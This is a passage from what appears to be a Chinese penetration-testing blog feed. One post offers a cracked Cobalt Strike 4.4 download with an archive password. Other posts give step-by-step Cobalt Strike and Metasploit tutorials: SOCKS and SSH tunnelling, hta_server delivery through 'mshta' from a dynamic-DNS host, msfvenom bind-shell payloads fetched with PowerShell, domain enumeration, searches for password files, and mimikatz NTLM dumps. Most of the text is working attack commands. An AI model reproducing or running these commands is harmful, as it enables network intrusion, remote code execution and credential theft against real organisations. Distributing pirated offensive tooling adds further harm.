单击屏幕截图&#x2F;击键选项卡不会立即聚焦列表</span><br><span class="line">+ 修复了“listener_create_ext”攻击函数中缺少的主机轮换“策略”选项文档</span><br></pre></td></tr></table></figure></div>

<p>官网更新查看地址:</p>
<p><a href="https://www.cobaltstrike.com/releasenotes.txt" target="_blank" rel="noopener">cobaltstrike.com/releasenotes.txt</a></p>
<h2 id="cobalt-strike4-4破解版运行测试"><a href="#cobalt-strike4-4破解版运行测试" class="headerlink" title="cobalt strike4.4破解版运行测试"></a>cobalt strike4.4破解版运行测试</h2><p>服务器上运行截图</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-7.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-7.webp" alt="cobalt strike4.4破解版下载|cs4.4|cobalt strike4.4 cracked"></a>报错出现某文件缺失.</p>
<p>但是依然可以跑起来.</p>
<p>生成木马测试可以正常上线和读取文件.</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-5.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-5.webp" alt="cobalt strike4.4破解版下载|cs4.4|cobalt strike4.4 cracked"></a></p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-6-1.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-6-1.webp" alt="cobalt strike4.4破解版下载|cs4.4|cobalt strike4.4 cracked"></a></p>
<h2 id="目前发现存在的问题"><a href="#目前发现存在的问题" class="headerlink" title="目前发现存在的问题"></a>目前发现存在的问题</h2><p>①点击截图软件自动退出</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-8.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-8.webp" alt="cobalt strike4.4破解版下载|cs4.4|cobalt strike4.4 cracked"></a></p>
<p>②Event Log和命令执行不显示</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-9.webp" target="_blank" rel="noopener"><img src="https://www.ddosi.org/wp-content/uploads/2021/09/cs4.4-9.webp" alt="cobalt strike4.4破解版下载|cs4.4|cobalt strike4.4 cracked"></a></p>
<p>可见此破解版并不完美,有能力修复者,勇于尝试者推荐下载</p>
<h2 id="Cobalt-strike4-4破解版下载地址"><a href="#Cobalt-strike4-4破解版下载地址" class="headerlink" title="Cobalt strike4.4破解版下载地址"></a>Cobalt strike4.4破解版下载地址</h2><p>①云中转网盘:</p>
<p><a href="https://www.yunzhongzhuan.com/#sharefile=cZ5voWkm_9644" target="_blank" rel="noopener">yunzhongzhuan.com/#sharefile=cZ5voWkm_9644</a><br>解压密码: <a href="http://www.ddosi.org" target="_blank" rel="noopener">www.ddosi.org</a></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>cobalt strike4.4破解版来源于国外论坛,<strong>安全性未知.</strong><br>切勿用于任何生产环境,务必放虚拟机运行.<br>仅可作为研究使用.</p>
<p><a href="https://www.ddosi.org/cobalt-strike4-4/" target="_blank" rel="noopener">from</a></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
        <tag>cracked</tag>
        <tag>远控工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike的SSH隧道在beacon的应用</title>
    <url>/posts/130.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike基本学习</li>
</ul>
</blockquote>
<h1 id="SSH在隧道里的运行"><a href="#SSH在隧道里的运行" class="headerlink" title="SSH在隧道里的运行"></a>SSH在隧道里的运行</h1><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910164631709.png" alt="image-20210910164631709"></p>
</blockquote>
<p>这里说一下关于我的理解，当用socat将对方的445端口代理到我们的445端口上时，访问我们的445端口，则会通过本地的1080来去访问对方的445端口</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910165149697.png" alt="image-20210910165149697"></p>
</blockquote>
<p>根据图片可以了解到，那我们利用1080端口去登陆对方ubuntu的22端口，然后socat通过1080连接上了对方的ubuntu，再接着通过ubuntu访问到了对方的机子445端口</p>
<p>简单的就是这样流程</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">kali 445--&gt; kali 1080 --&gt; ubuntu 22 --&gt; windows 445</span><br></pre></td></tr></table></figure></div>

<p><strong>这个前提是我们知道对方ubuntu的密码</strong></p>
<p>首先挂个socks代理脸上对方的内网，用proxychains4来连接对方的ssh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">proxychains4 ssh -D 1080 moonteam@192.168.136.147</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910165558115.png" alt="image-20210910165558115"></p>
</blockquote>
<p><strong>接着在当前kali中将445端口代理到对方windows机子上</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.136.146:445</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910165752114.png" alt="image-20210910165752114"></p>
</blockquote>
<p><strong>实际查看一下是否开启了端口，发现成功代理</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910165714669.png" alt="image-20210910165714669"></p>
</blockquote>
<p>就可以再beacon上实操了，直接访问本地的192.168.1.105ip的445可以直接连接到192.168.136.146的机子上</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910165921453.png" alt="image-20210910165921453"></p>
</blockquote>
<p>实际上访问192.168.136.146的情况，效果一样成功了。</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910170224939.png" alt="image-20210910170224939"></p>
</blockquote>
<p><strong>smb的445端口令牌传递成功上线cs</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">psexec_psh 192.168.1.105 smb-beacon</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910171513861.png" alt="image-20210910171513861"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike隧道使用</title>
    <url>/posts/129.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike基本学习</li>
</ul>
</blockquote>
<h1 id="隧道使用"><a href="#隧道使用" class="headerlink" title="隧道使用"></a>隧道使用</h1><p>这里操作更顺滑</p>
<p>直接socks代理</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910152610163.png" alt="image-20210910152610163"></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910152533856.png" alt="image-20210910152533856"></p>
<p>然后本地用proxychains4a代理sock4就行了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910152642800.png" alt="image-20210910152642800"></p>
</blockquote>
<p>接着就可以用proxychains4来扫描该主机的tcp端口</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910153207961.png" alt="image-20210910153207961"></p>
</blockquote>
<h1 id="MSF在beacon的使用"><a href="#MSF在beacon的使用" class="headerlink" title="MSF在beacon的使用"></a>MSF在beacon的使用</h1><p>同样的也可以代理到msf中，可以发送信息和接收信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910153352832.png" alt="image-20210910153352832"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">setg Proxies socks4:192.168.1.105:33241</span><br><span class="line">setg ReverseAllowProxy true &#x2F;&#x2F;反向代理</span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_versio</span><br><span class="line">unsetg Proxies 取消代理</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910154114970.png" alt="image-20210910154114970"></p>
</blockquote>
<p>也可以用listen在目标机子上监听</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910155702505.png" alt="image-20210910155702505"></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910155801614.png" alt="image-20210910155801614"></p>
<p>接着生成一个木马</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210910155826863.png" alt="image-20210910155826863"></p>
</blockquote>
<p>在其他内网机子中执行即可。</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike自动化横向渗透</title>
    <url>/posts/128.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike基本学习</li>
</ul>
</blockquote>
<h1 id="自动化横向渗透"><a href="#自动化横向渗透" class="headerlink" title="自动化横向渗透"></a>自动化横向渗透</h1><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909145945123.png" alt="image-20210909145945123"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909145755638.png" alt="image-20210909145755638"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】metaslpoit不出网上线</title>
    <url>/posts/134.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="hta-server模块使用"><a href="#hta-server模块使用" class="headerlink" title="hta_server模块使用"></a>hta_server模块使用</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">set target 1</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set SRVPORT 80</span><br><span class="line">set lhost ad39402345.wicp.vip</span><br><span class="line">set lport 26240</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908142347303.png" alt="image-20210908142347303"></p>
</blockquote>
<p>接着在webshell中执行来web传递</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;ad39402345.wicp.vip&#x2F;Q2Uo0sNe.hta</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908142453263.png" alt="image-20210908142453263"></p>
</blockquote>
<p>接着用来添加路由</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">run autoroute -s 192.168.186.0&#x2F;255.255.255.0</span><br><span class="line">run autoroute -d -s 192.168.186.0</span><br><span class="line">bg</span><br></pre></td></tr></table></figure></div>

<p>然后在该联网主机上建立web传递</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908150023721.png" alt="image-20210908150023721"></p>
</blockquote>
<p>再用断网主机访问mshta就行了</p>
<h1 id="Proxychains实现bind连接"><a href="#Proxychains实现bind连接" class="headerlink" title="Proxychains实现bind连接"></a>Proxychains实现bind连接</h1><blockquote>
<p>接着上面的加一个proxy</p>
</blockquote>
<p>生成一个木马</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;443 -f exe &gt; bind.exe</span><br></pre></td></tr></table></figure></div>

<p>利用webshell上传</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908154010042.png" alt="image-20210908154010042"></p>
</blockquote>
<p>接着用不出网的主机powershell下载这个bind.exe</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$client &#x3D; new-object System.Net.WebClient</span><br><span class="line">$client.DownloadFile(&#39;http:&#x2F;&#x2F;10.0.1.4&#x2F;payload.exe&#39;,&#39;C:&#x2F;test.exe&#39;)</span><br></pre></td></tr></table></figure></div>

<p>接着执行就可以发现443开始监听了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908154836794.png" alt="image-20210908154836794"></p>
</blockquote>
<p>接着bind连接进去</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set rhost 192.168.186.4</span><br><span class="line">set lport 443</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908154903887.png" alt="image-20210908154903887"></p>
</blockquote>
<p>远程连接命令mstsc(microsoft terminal server client)</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>内网渗透</tag>
        <tag>Metasploit</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike横向渗透域控</title>
    <url>/posts/135.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike的基础使用，自建的域控，就一台用</li>
</ul>
</blockquote>
<h1 id="搭建好了域控机"><a href="#搭建好了域控机" class="headerlink" title="搭建好了域控机"></a>搭建好了域控机</h1><blockquote>
<p>目标：</p>
<p>1、一台2008R2的DC  192.168.136.133</p>
<p>2、一台2003 server的域内机器 192.168.136.136</p>
<p>3、一台2008R2的B2 192.168.136.138</p>
</blockquote>
<h1 id="内网渗透拿域控"><a href="#内网渗透拿域控" class="headerlink" title="内网渗透拿域控"></a>内网渗透拿域控</h1><blockquote>
<p>kali 192.168.1.104</p>
</blockquote>
<h2 id="一、cs上线"><a href="#一、cs上线" class="headerlink" title="一、cs上线"></a>一、cs上线</h2><p>①直接用web传递发现失效了，原因是2003居然没有powershell，那就传马，由于cs马传上去无法运行，所以就用msf马监听拿到shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908184613412.png" alt="image-20210908184613412"></p>
</blockquote>
<p>②接着就将会话转给cs</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set lport 80</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908184850148.png" alt="image-20210908184850148"></p>
</blockquote>
<h2 id="二、cs派生会话"><a href="#二、cs派生会话" class="headerlink" title="二、cs派生会话"></a>二、cs派生会话</h2><p>首先把它派生会话smb，可以绕防火墙</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908184955567.png" alt="image-20210908184955567"></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908185045946.png" alt="image-20210908185045946"></p>
<h2 id="三、cs的命令使用以及信息收集"><a href="#三、cs的命令使用以及信息收集" class="headerlink" title="三、cs的命令使用以及信息收集"></a>三、cs的命令使用以及信息收集</h2><p>1、查看当前用户组</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell whoami&#x2F;groups</span><br></pre></td></tr></table></figure></div>

<p>2、查看域</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net view &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908220051195.png" alt="image-20210908220051195"></p>
<p>3、枚举域内主机</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net view &#x2F;domain:GYLQ</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908220149806.png" alt="image-20210908220149806"></p>
</blockquote>
<p>4、查看DC的ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell ping WIN-NQ8TV3JGSN1</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210908220317639.png" alt="image-20210908220317639"></p>
<p><strong>接着我发现2003机子太low了，再添加一个2008的机子域内机子继续下面的测试，直接web传递，可以直接上线，server2008</strong></p>
<p>5、查看域内成员</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net group &quot;domain Computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909080349358.png" alt="image-20210909080349358"></p>
</blockquote>
<p>6、查看DC域控主机</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net group &quot;domain Controllers&quot; &#x2F;domain</span><br><span class="line">shell nltest&#x2F;dclist:GYLQ #也可以</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909080625448.png" alt="image-20210909080625448"></p>
</blockquote>
<p>7、查看域的信任关系</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell nltest &#x2F;domain_trusts</span><br></pre></td></tr></table></figure></div>

<p>8、导入了powershell的模块powerview.ps1的使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell Invoke-ShareFinder #查看共享的</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909081245501.png" alt="image-20210909081245501"></p>
</blockquote>
<p>9、cs的列举域控命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net dclist</span><br><span class="line">net dclist &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<p>10、列出共享cs命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net share \\B1</span><br></pre></td></tr></table></figure></div>

<p>11、判断是否能访问域控机的C盘，所以是域超级管理员</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell dir \\WIN-NQ8TV3JGSN1\C$</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909082213125.png" alt="image-20210909082213125"></p>
</blockquote>
<p>12、查看域内的管理员</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net group &quot;enterprise admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909082613139.png" alt="image-20210909082613139"></p>
</blockquote>
<p>13、域内的超级管理员</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net group &quot;domain admins&quot; &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909082718262.png" alt="image-20210909082718262"></p>
</blockquote>
<p>14、查看域内组中的超级管理员</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">shell net localgroup &quot;administrators&quot; &#x2F;domain</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909082828930.png" alt="image-20210909082828930"></p>
</blockquote>
<p>15、cs中的查看管理员组的信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net group \\WIN-NQ8TV3JGSN1</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909083027873.png" alt="image-20210909083027873"></p>
<p>16、查看远程的DC的管理员用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">net localgroup \\WIN-NQ8TV3JGSN1 administrators</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909083506375.png" alt="image-20210909083506375"></p>
<p>17、powerview模块的命令查看用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell Get-NetLocalGroup -HostName WIN-NQ8TV3JGSN1</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909083743109.png" alt="image-20210909083743109"></p>
</blockquote>
<p>18、单靠命令搜索用户，或者信息收集</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">1、查看登陆过的用户</span><br><span class="line">shell dir &#x2F;S &#x2F;B \\WIN-NQ8TV3JGSN1\C$\users</span><br><span class="line"></span><br><span class="line">2、查看敏感文件</span><br><span class="line">shell dir &#x2F;S &#x2F;B \\WIN-NQ8TV3JGSN1\C$\&quot;*pass*&quot; &quot;*user*&quot; &quot;*config*&quot; &quot;username.*&quot; &quot;password.*&quot;</span><br><span class="line"></span><br><span class="line">3、winrm执行powershell</span><br><span class="line">列举C盘目录</span><br><span class="line">powershell Invoke-Command -ComputerName WIN-NQ8TV3JGSN1 -ScriptBlock&#123; dir c:\&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909084747909.png" alt="image-20210909084747909"></p>
</blockquote>
<p>19、通过mimikatz抓取主域的NTLM</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210909090950387.png" alt="image-20210909090950387"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : B1$</span><br><span class="line">	 * Domain   : GYLQ</span><br><span class="line">	 * NTLM     : ccf1ceaea1d47a0948e5022bd4d7ae64</span><br><span class="line">	 * SHA1     : 0ea509056cd0d8ab09f6deeec8ba2db643bae89e</span><br></pre></td></tr></table></figure></div>

<h2 id="四、内网登陆认证"><a href="#四、内网登陆认证" class="headerlink" title="四、内网登陆认证"></a>四、内网登陆认证</h2><p>1、制作token访问域控</p>
